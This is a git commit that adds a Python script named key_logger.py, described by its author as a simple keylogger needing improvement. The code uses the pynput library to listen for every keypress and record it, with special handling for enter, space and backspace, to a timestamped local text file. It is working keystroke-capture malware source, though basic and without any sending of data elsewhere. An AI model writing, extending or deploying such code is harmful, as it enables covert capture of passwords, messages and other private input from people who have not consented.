1590c552f566baf514053afb8a0aa66aa0be6d14
SebastianOhberg <sebastian.ohberg01@gmail.com>
2022-03-21 21:54:19 -0300

    Simple keylogger, need improve

---
+++ key_logger.py
@@ -0,0 +1,20 @@
+import datetime
+from pynput.keyboard import Listener
+
+d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+f = open('keylogger_{}.txt'.format(d), 'w') 
+
+def key_recorder(key):
+    key = str(key)
+
+    if key == 'Key.enter':
+        f.write('\n')
+    elif key == 'Key.space':
+        f.write(' ')
+    elif key == 'Key.backspace':
+        f.write('%BORRAR%')
+    else:
+        f.write(key.replace("'",""))
+
+with Listener(on_press=key_recorder) as l:
+    l.join()
